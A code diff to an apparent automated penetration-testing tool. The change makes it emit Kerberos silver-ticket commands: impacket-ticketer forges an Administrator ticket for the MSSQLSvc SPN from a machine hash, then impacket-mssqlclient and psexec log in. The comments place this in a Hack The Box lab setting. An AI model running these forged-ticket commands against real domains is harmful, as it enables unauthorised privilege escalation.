@@ -809,6 +809,31 @@ def run(report, store, ui=None):
             # iter-55: substitute learned domain into the SPN FQDN so the
             # silver ticket targets the real service. Falls back to '<dom>'
             # placeholder when unknown.
+            # iter-133: also emit MSSQLSvc silver-ticket variant when the
+            # store confirms MSSQL is running on this host. The primitive is
+            # identical (impacket-ticketer -spn), but the SPN class changes
+            # and the follow-up client is mssqlclient not psexec. Common
+            # HTB pattern: SYSTEM on a domain-joined SQL Server, dump the
+            # machine hash from SECURITY, then silver-ticket 'sa' onto MSSQL.
+            # Use store.canon() to resolve short-name -> IP; nmap gnmap
+            # emits IPs but the machine account is HOSTNAME$, so a direct
+            # name-comparison would miss. canon() looks up the alias table.
+            _mssql_hosts = {store.canon(h)
+                            for h in store.hosts_with_service(("mssql",))}
+            _mssql_here = (store.canon(host_short) in _mssql_hosts
+                           or host_short.lower() in _mssql_hosts)
+            _extra_cmds = []
+            if _mssql_here:
+                _extra_cmds = [
+                    f"# {host_short} runs MSSQL - also forge for the MSSQL SPN:",
+                    f"impacket-ticketer -nthash {h} -domain-sid {_sid_sv} "
+                    f"-domain {_dom_sv} -spn MSSQLSvc/{host_short}.{_dom_sv}:1433 "
+                    f"Administrator",
+                    f"export KRB5CCNAME=Administrator.ccache",
+                    f"impacket-mssqlclient -k -no-pass "
+                    f"'{_dom_sv}/Administrator@{host_short}.{_dom_sv}' "
+                    f"-windows-auth   # sa-tier access via ticket",
+                ]
             chains.append(Chain("R-SILVER", "silver ticket",
                 f"machine hash {host_short}$ -> silver ticket forgery for {host_short}",
                 crit=9, conf=0.9, ready=1.4, prox=0.9,      # score 10.2
@@ -821,6 +846,7 @@ def run(report, store, ui=None):
                     # iter-108: shell-safe quoted URI.
                     f"impacket-psexec -k -no-pass -dc-ip {_dc_sv} "
                     f"'{_dom_sv}/Administrator@{host_short}.{_dom_sv}'",
+                    *_extra_cmds,
                 ], src=hsrc, line=hln))
             break
 
